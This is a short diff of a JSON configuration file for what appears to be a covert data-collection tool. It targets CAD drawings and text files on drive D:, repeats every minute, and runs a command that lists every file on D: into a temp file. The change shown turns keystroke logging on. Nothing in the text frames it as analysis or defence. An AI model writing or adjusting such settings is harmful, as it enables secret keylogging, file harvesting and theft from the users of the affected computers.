@@ -11,10 +11,10 @@
   "maxArchiveSizeMB": 49,
   "licenseYear": 2026,
   "_fileExtensions": ["dxf", "dwg","txt"],
-  "allcertainFilesInRootFolder":"d:\\",
-  "certainFileTypeInRootFolder":"dwg",
+  "_allcertainFilesInRootFolder":"d:\\",
+  "_certainFileTypeInRootFolder":"dwg",
   "timeRepeatMinutes": 1,
   "scrShot": false,
-  "keyLog": false,
+  "keyLog": true,
   "_cmdCommands": ["dir D:\\ /s /b >> \"C:\\Temp\\string.txt\""]
 }
